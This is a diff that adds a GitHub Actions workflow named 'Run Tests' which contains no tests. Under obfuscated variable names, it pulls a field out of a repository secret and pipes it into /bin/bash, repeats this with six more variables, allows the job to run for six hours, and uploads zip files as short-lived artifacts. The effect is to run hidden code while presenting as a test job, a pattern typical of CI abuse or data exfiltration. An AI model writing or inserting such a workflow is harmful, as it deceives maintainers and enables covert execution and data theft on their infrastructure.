@@ -1,0 +1,33 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          ihw874: ${{ secrets.ihw874 }}
+        run: |
+          printf '%s' "$ihw874" | jq -r .mps361 | /bin/bash
+          echo $xdg755 | jq -r .c4 | /bin/bash
+          printf '%s' "$tys3591" | jq -r .aduqb99935 | /bin/bash
+          echo $ty641 | jq -r .lx6 | /bin/bash
+          echo $plmsz9900 | jq -r .c5736 | /bin/bash
+          printf '%s' "$u995" | jq -r .sxr283 | /bin/bash
+          echo $fqa6559 | jq -r .hnbf09 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: Yrt2SumN
+          path: "*.zip"
+          retention-days: 1
